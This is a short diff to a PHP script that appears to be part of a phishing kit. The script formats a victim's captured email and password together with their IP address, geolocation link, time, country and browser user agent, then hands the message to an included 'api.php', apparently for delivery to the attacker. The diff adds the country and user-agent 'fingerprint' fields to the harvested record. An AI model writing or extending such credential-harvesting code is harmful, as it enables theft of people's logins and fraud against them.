@@ -65,10 +65,11 @@ $msg = ("
 PUNYA SI  = ".$email."
 PASSWORD  = ".$password."
 
-😳😳😳😳😳😳😳😳😳😳😳😳😳😳😳😳😳😳
+[+]============System============[+]
 [IP INFO] = http://www.geoiptool.com/?IP=".$IP."
-[TIME/DATE] =".$times." / ".$date."/".$country."
-😳😳😳😳😳😳😳😳😳😳😳😳😳😳😳😳😳😳
+[TIME/DATE] =".$times." / ".$date."
+[Country] = ".$country."
+[FINGERPRINT] = ".$useragent."
 ");
 $url = $msg;include("api.php");
 
